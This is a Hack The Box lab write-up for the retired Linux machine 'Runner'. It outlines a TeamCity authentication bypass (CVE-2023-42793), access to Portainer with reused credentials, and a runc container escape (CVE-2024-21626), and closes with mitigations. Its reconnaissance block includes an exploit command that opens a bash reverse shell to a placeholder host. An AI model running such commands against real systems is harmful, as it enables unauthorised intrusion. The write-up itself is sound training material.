---
machine: Runner
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, teamcity, portainer, runc, container-escape]
---

# Runner — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

TeamCity is vulnerable to CVE-2023-42793: an authentication bypass allows creating a build and executing code. Recovered credentials grant Portainer access; an image built there exploits runc CVE-2024-21626 and escapes to the host.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,80,8111 <IP>
curl -s http://runner.htb:8111/login.html | grep -i teamcity
# CVE-2023-42793
python3 teamcity_exploit.py -u http://runner.htb:8111 -c "bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'"
# Portainer
curl -k https://runner.htb:9443/api/endpoints
# runc CVE-2024-21626
docker build -t escape . && docker run --rm -it escape
```

## Enumeration

- TeamCity on `8111` with a vulnerable version.
- Portainer reachable with reused credentials.
- The Portainer API allows building images and running containers.

## Initial access

The TeamCity authentication bypass allows admin access, creating a project and a build with a command-line step. The build runs on the agent and returns a shell as the CI user.

## Privilege escalation

From the host, access Portainer with the recovered credentials. Build an image with a manipulated working directory and exploit the runc file-descriptor leak to write outside the container and execute as root.

## Evidence

- TeamCity bypass and build callback.
- Portainer access and image creation.
- `/proc/self/fd` pointing at the host and root shell.

## Lessons learned

- A CI server is code execution by design.
- Portainer with weak credentials amplifies impact.
- An unpatched container runtime breaks isolation.

## Mitigation and detection

- Update TeamCity and require MFA.
- Restrict Portainer and use short-lived tokens.
- Update runc and enforce seccomp/AppArmor on containers.

## References

- [0xdf — Runner](https://0xdf.gitlab.io/2024/08/24/htb-runner.html)
- [NVD — CVE-2024-21626](https://nvd.nist.gov/vuln/detail/CVE-2024-21626)
- [Hack The Box — Runner](https://app.hackthebox.com/machines/runner)
